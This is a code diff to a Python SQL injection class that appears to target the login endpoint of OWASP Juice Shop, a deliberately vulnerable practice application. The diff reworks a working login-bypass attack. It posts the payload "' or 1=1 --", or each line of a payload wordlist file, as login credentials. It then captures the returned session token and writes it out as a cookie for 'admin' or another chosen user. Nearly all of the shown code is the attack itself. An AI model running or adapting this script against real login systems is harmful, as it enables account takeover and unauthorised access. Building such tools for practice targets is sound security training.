@@ -1,13 +1,12 @@
 from . import attack as a
 
 class SQL_injector(a.attack_inter):
-    def __init__(self, dictionary=None):
-        self.dictionary = dictionary
+    def __init__(self):
         self.juice_session = a.requests.session()
         self.url = a.URL + '/rest/user/login'
         #self.juice_session.cookies = a.cookielib.LWPCookieJar(filename="./juiceShopCookies.txt")
 
-    def generator(self, myScript='\' or 1=1 --'):
+    def generator(self, myScript):
         #cookies = COOKIE
         headers = a.HEADER
 
@@ -18,9 +17,10 @@ class SQL_injector(a.attack_inter):
 
         return headers, json_data
 
-    def run(self):
-        if self.dictionary:
-            f = open(self.dictionary, "r")
+    def run(self, userInput = '\' or 1=1 --', username = 'admin'):
+        # [-4:]
+        if userInput[-4:] == '.txt':
+            f = open(userInput, "r")
             for line in f:
                 line = line.rstrip()
                 headers, json_data = self.generator(line)
@@ -36,10 +36,10 @@ class SQL_injector(a.attack_inter):
 
                     new_cookie = a.COOKIE
                     new_cookie["token"] = new_token
-                    a.write_cookie(new_cookie)
+                    a.write_cookie('admin',new_cookie)
                     break
         else:
-            headers, json_data = self.generator()
+            headers, json_data = self.generator(userInput)
             response = self.juice_session.post(self.url, json=json_data)
             print(response.status_code)
             if response.status_code == 200:
@@ -50,4 +50,5 @@ class SQL_injector(a.attack_inter):
                 print(response.headers)
                 new_cookie = a.COOKIE
                 new_cookie["token"] = new_token
-                a.write_cookie('admin',new_cookie)
+                a.write_cookie(username,new_cookie)
+            return response.status_code
